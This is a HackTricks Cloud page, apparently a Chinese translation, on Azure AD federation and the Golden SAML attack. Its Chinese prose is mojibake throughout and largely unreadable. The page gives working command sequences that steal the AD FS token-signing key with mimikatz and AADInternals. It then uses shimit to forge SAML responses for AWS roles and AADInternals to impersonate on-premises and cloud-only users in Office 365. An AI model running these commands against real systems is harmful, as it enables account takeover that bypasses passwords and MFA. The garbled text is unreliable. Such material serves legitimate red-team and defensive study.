# Az - Federation

{% hint style="success" %}
å­¦ä¹ å’Œç»ƒä¹  AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œç»ƒä¹  GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡æäº¤ PRs åˆ†äº«é»‘å®¢æŠ€å·§åˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“ã€‚

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

[æ¥è‡ªæ–‡æ¡£:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federation** æ˜¯ä¸€ç»„å»ºç«‹äº† **ä¿¡ä»»** çš„ **åŸŸ**ã€‚ä¿¡ä»»çš„çº§åˆ«å¯èƒ½æœ‰æ‰€ä¸åŒï¼Œä½†é€šå¸¸åŒ…æ‹¬ **è®¤è¯**ï¼Œå‡ ä¹æ€»æ˜¯åŒ…æ‹¬ **æˆæƒ**ã€‚ä¸€ä¸ªå…¸å‹çš„ Federation å¯èƒ½åŒ…æ‹¬å¤šä¸ªç»„ç»‡ï¼Œè¿™äº›ç»„ç»‡ä¸ºå…±äº«è®¿é—®ä¸€ç»„èµ„æºå»ºç«‹äº†ä¿¡ä»»ã€‚

ä½ å¯ä»¥å°† **æœ¬åœ°ç¯å¢ƒ** ä¸ **Azure AD** è”é‚¦ï¼Œå¹¶ä½¿ç”¨æ­¤è”é‚¦è¿›è¡Œè®¤è¯å’Œæˆæƒã€‚è¿™ç§ç™»å½•æ–¹æ³•ç¡®ä¿æ‰€æœ‰ç”¨æˆ· **è®¤è¯éƒ½åœ¨æœ¬åœ°è¿›è¡Œ**ã€‚è¿™ç§æ–¹æ³•å…è®¸ç®¡ç†å‘˜å®æ–½æ›´ä¸¥æ ¼çš„è®¿é—®æ§åˆ¶ã€‚å¯ä»¥ä½¿ç”¨ **AD FS** å’Œ PingFederate è¿›è¡Œè”é‚¦ã€‚

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

åŸºæœ¬ä¸Šï¼Œåœ¨ Federation ä¸­ï¼Œæ‰€æœ‰ **è®¤è¯** éƒ½åœ¨ **æœ¬åœ°** ç¯å¢ƒä¸­è¿›è¡Œï¼Œç”¨æˆ·åœ¨æ‰€æœ‰å—ä¿¡ç¯å¢ƒä¸­ä½“éªŒ SSOã€‚å› æ­¤ï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨ä»–ä»¬çš„ **æœ¬åœ°å‡­æ®** è®¿é—® **äº‘** åº”ç”¨ç¨‹åºã€‚

**Security Assertion Markup Language (SAML)** ç”¨äºåœ¨æä¾›è€…ä¹‹é—´ **äº¤æ¢** æ‰€æœ‰çš„è®¤è¯å’Œæˆæƒ **ä¿¡æ¯**ã€‚

åœ¨ä»»ä½•è”é‚¦è®¾ç½®ä¸­ï¼Œæœ‰ä¸‰æ–¹ï¼š

* ç”¨æˆ·æˆ–å®¢æˆ·ç«¯
* èº«ä»½æä¾›è€… (IdP)
* æœåŠ¡æä¾›è€… (SP)

(å›¾ç‰‡æ¥è‡ª https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. æœ€åˆï¼Œç”¨æˆ·è®¿é—®ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼ˆæœåŠ¡æä¾›è€…æˆ– SPï¼Œä¾‹å¦‚ AWS æ§åˆ¶å°æˆ– vSphere web å®¢æˆ·ç«¯ï¼‰ã€‚è¿™ä¸€æ­¥å¯èƒ½ä¼šè¢«ç»•è¿‡ï¼Œç›´æ¥å°†å®¢æˆ·ç«¯å¼•å¯¼åˆ° IdPï¼ˆèº«ä»½æä¾›è€…ï¼‰ï¼Œå…·ä½“å–å†³äºå…·ä½“å®ç°ã€‚
2. éšåï¼ŒSP ç¡®å®šé€‚å½“çš„ IdPï¼ˆä¾‹å¦‚ AD FS, Oktaï¼‰è¿›è¡Œç”¨æˆ·è®¤è¯ã€‚ç„¶åå®ƒåˆ›å»ºä¸€ä¸ª SAMLï¼ˆå®‰å…¨æ–­è¨€æ ‡è®°è¯­è¨€ï¼‰AuthnRequest å¹¶å°†å®¢æˆ·ç«¯é‡å®šå‘åˆ°é€‰å®šçš„ IdPã€‚
3. IdP æ¥ç®¡ï¼Œè®¤è¯ç”¨æˆ·ã€‚è®¤è¯åï¼ŒIdP ç”Ÿæˆä¸€ä¸ª SAMLResponse å¹¶é€šè¿‡ç”¨æˆ·å°†å…¶è½¬å‘ç»™ SPã€‚
4. æœ€åï¼ŒSP è¯„ä¼° SAMLResponseã€‚å¦‚æœéªŒè¯æˆåŠŸï¼Œæ„å‘³ç€ä¸ IdP å­˜åœ¨ä¿¡ä»»å…³ç³»ï¼Œç”¨æˆ·å°†è¢«æˆäºˆè®¿é—®æƒé™ã€‚è¿™æ ‡å¿—ç€ç™»å½•è¿‡ç¨‹çš„å®Œæˆï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨è¯¥æœåŠ¡ã€‚

**å¦‚æœä½ æƒ³äº†è§£æ›´å¤šå…³äº SAML è®¤è¯å’Œå¸¸è§æ”»å‡»ï¼Œè¯·è®¿é—®:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## æ¨ªå‘ç§»åŠ¨

* AD FS æ˜¯ä¸€ç§åŸºäºå£°æ˜çš„èº«ä»½æ¨¡å‹ã€‚
* "..å£°æ˜åªæ˜¯å…³äºç”¨æˆ·çš„é™ˆè¿°ï¼ˆä¾‹å¦‚ï¼Œå§“åã€èº«ä»½ã€ç»„ï¼‰ï¼Œä¸»è¦ç”¨äºæˆæƒè®¿é—®ä½äºäº’è”ç½‘ä»»ä½•åœ°æ–¹çš„åŸºäºå£°æ˜çš„åº”ç”¨ç¨‹åºã€‚"
* ç”¨æˆ·çš„å£°æ˜å†™åœ¨ SAML ä»¤ç‰Œä¸­ï¼Œå¹¶ç”± IdP ç­¾åä»¥æä¾›æœºå¯†æ€§ã€‚
* ç”¨æˆ·é€šè¿‡ ImmutableID è¯†åˆ«ã€‚å®ƒæ˜¯å…¨å±€å”¯ä¸€çš„ï¼Œå­˜å‚¨åœ¨ Azure AD ä¸­ã€‚
* ImmutableID å­˜å‚¨åœ¨æœ¬åœ°ä½œä¸ºç”¨æˆ·çš„ ms-DS-ConsistencyGuidï¼Œæˆ–å¯ä»¥ä»ç”¨æˆ·çš„ GUID æ´¾ç”Ÿã€‚
* æ›´å¤šä¿¡æ¯è¯·è®¿é—® [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAML æ”»å‡»:**

* åœ¨ ADFS ä¸­ï¼ŒSAML Response ç”±ä»¤ç‰Œç­¾åè¯ä¹¦ç­¾åã€‚
* å¦‚æœè¯ä¹¦è¢«æ³„éœ²ï¼Œå¯ä»¥ä»¥ä»»ä½•åŒæ­¥åˆ° Azure AD çš„ç”¨æˆ·èº«ä»½è®¤è¯åˆ° Azure ADï¼
* å°±åƒæˆ‘ä»¬çš„ PTA æ»¥ç”¨ä¸€æ ·ï¼Œç”¨æˆ·çš„å¯†ç æ›´æ”¹æˆ– MFA ä¸ä¼šæœ‰ä»»ä½•å½±å“ï¼Œå› ä¸ºæˆ‘ä»¬æ­£åœ¨ä¼ªé€ è®¤è¯å“åº”ã€‚
* è¯ä¹¦å¯ä»¥ä»å…·æœ‰ DA æƒé™çš„ AD FS æœåŠ¡å™¨ä¸­æå–ï¼Œç„¶åå¯ä»¥ä»ä»»ä½•è¿æ¥åˆ°äº’è”ç½‘çš„æœºå™¨ä¸Šä½¿ç”¨ã€‚
* æ›´å¤šä¿¡æ¯è¯·è®¿é—® [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

**èº«ä»½æä¾›è€… (IdP)** ç”Ÿæˆ **SAMLResponse** ä»¥æˆæƒç”¨æˆ·ç™»å½•çš„è¿‡ç¨‹è‡³å…³é‡è¦ã€‚æ ¹æ® IdP çš„å…·ä½“å®ç°ï¼Œ**å“åº”** å¯èƒ½ä¼šä½¿ç”¨ **IdP çš„ç§é’¥** **ç­¾å** æˆ– **åŠ å¯†**ã€‚æ­¤è¿‡ç¨‹ä½¿ **æœåŠ¡æä¾›è€… (SP)** èƒ½å¤Ÿç¡®è®¤ SAMLResponse çš„çœŸå®æ€§ï¼Œç¡®ä¿å®ƒç¡®å®æ˜¯ç”±å—ä¿¡ä»»çš„ IdP å‘å‡ºçš„ã€‚

å¯ä»¥ä¸ [golden ticket æ”»å‡»](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket) ç±»æ¯”ï¼Œå…¶ä¸­ç”¨äºè®¤è¯ç”¨æˆ·èº«ä»½å’Œæƒé™çš„å¯†é’¥ï¼ˆgolden ticket çš„ KRBTGTï¼Œgolden SAML çš„ä»¤ç‰Œç­¾åç§é’¥ï¼‰å¯ä»¥è¢«æ“çºµä»¥ **ä¼ªé€ è®¤è¯å¯¹è±¡**ï¼ˆTGT æˆ– SAMLResponseï¼‰ã€‚è¿™å…è®¸å†’å……ä»»ä½•ç”¨æˆ·ï¼Œæˆäºˆå¯¹ SP çš„æœªæˆæƒè®¿é—®ã€‚

Golden SAML å…·æœ‰æŸäº›ä¼˜åŠ¿ï¼š

* å®ƒä»¬å¯ä»¥ **è¿œç¨‹åˆ›å»º**ï¼Œæ— éœ€æˆä¸ºç›¸å…³åŸŸæˆ–è”é‚¦çš„ä¸€éƒ¨åˆ†ã€‚
* å³ä½¿å¯ç”¨äº† **åŒå› ç´ è®¤è¯ (2FA)**ï¼Œå®ƒä»¬ä»ç„¶æœ‰æ•ˆã€‚
* ä»¤ç‰Œç­¾å **ç§é’¥ä¸ä¼šè‡ªåŠ¨æ›´æ–°**ã€‚
* **æ›´æ”¹ç”¨æˆ·å¯†ç ä¸ä¼šä½¿å·²ç”Ÿæˆçš„ SAML å¤±æ•ˆ**ã€‚

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) æ˜¯ä¸€ç§ Microsoft æœåŠ¡ï¼Œä¿ƒè¿›äº†å—ä¿¡ä¸šåŠ¡ä¼™ä¼´ï¼ˆè”é‚¦ï¼‰ä¹‹é—´ **èº«ä»½ä¿¡æ¯çš„å®‰å…¨äº¤æ¢**ã€‚å®ƒæœ¬è´¨ä¸Šå…è®¸åŸŸæœåŠ¡ä¸è”é‚¦å†…çš„å…¶ä»–æœåŠ¡æä¾›è€…å…±äº«ç”¨æˆ·èº«ä»½ã€‚

ç”±äº AWS ä¿¡ä»»è¢«æ³„éœ²çš„åŸŸï¼ˆåœ¨è”é‚¦ä¸­ï¼‰ï¼Œæ­¤æ¼æ´å¯ä»¥è¢«åˆ©ç”¨ä»¥æ½œåœ¨åœ° **è·å– AWS ç¯å¢ƒä¸­çš„ä»»ä½•æƒé™**ã€‚æ­¤æ”»å‡»éœ€è¦ **ç”¨äºç­¾ç½² SAML å¯¹è±¡çš„ç§é’¥**ï¼Œç±»ä¼¼äº golden ticket æ”»å‡»ä¸­éœ€è¦ KRBTGTã€‚è®¿é—® AD FS ç”¨æˆ·å¸æˆ·è¶³ä»¥è·å–æ­¤ç§é’¥ã€‚

æ‰§è¡Œ golden SAML æ”»å‡»çš„è¦æ±‚åŒ…æ‹¬ï¼š

* **ä»¤ç‰Œç­¾åç§é’¥**
* **IdP å…¬å…±è¯ä¹¦**
* **IdP åç§°**
* **è§’è‰²åç§°ï¼ˆè¦å‡è®¾çš„è§’è‰²ï¼‰**
* åŸŸ\ç”¨æˆ·å
* AWS ä¸­çš„è§’è‰²ä¼šè¯åç§°
* Amazon è´¦æˆ· ID

_åªæœ‰åŠ ç²—çš„é¡¹ç›®æ˜¯å¿…éœ€çš„ã€‚å…¶ä»–å¯ä»¥æ ¹æ®éœ€è¦å¡«å†™ã€‚_

è¦è·å– **ç§é’¥**ï¼Œéœ€è¦è®¿é—® **AD FS ç”¨æˆ·å¸æˆ·**ã€‚ä»é‚£é‡Œï¼Œå¯ä»¥ä½¿ç”¨ [mimikatz](https://github.com/gentilkiwi/mimikatz) ç­‰å·¥å…·ä»ä¸ªäººå­˜å‚¨ä¸­ **å¯¼å‡ºç§é’¥**ã€‚è¦æ”¶é›†å…¶ä»–æ‰€éœ€ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨ Microsoft.Adfs.Powershell snapinï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œç¡®ä¿ä½ ä»¥ ADFS ç”¨æˆ·èº«ä»½ç™»å½•ï¼š
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
æœ‰äº†æ‰€æœ‰ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨ [**shimit**](https://github.com/cyberark/shimit) ä¼ªé€ ä¸€ä¸ªæœ‰æ•ˆçš„ SAMLResponse ä½œä¸ºä½ æƒ³è¦å†’å……çš„ç”¨æˆ·**ï¼š**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### æœ¬åœ° -> äº‘
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
ä¹Ÿå¯ä»¥åˆ›å»ºä»…äº‘ç”¨æˆ·çš„ImmutableIDå¹¶å†’å……ä»–ä»¬
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## å‚è€ƒèµ„æ–™

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
å­¦ä¹ å’Œç»ƒä¹  AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œç»ƒä¹  GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡æäº¤ PRs åˆ†äº« hacking æŠ€å·§åˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“.

</details>
{% endhint %}
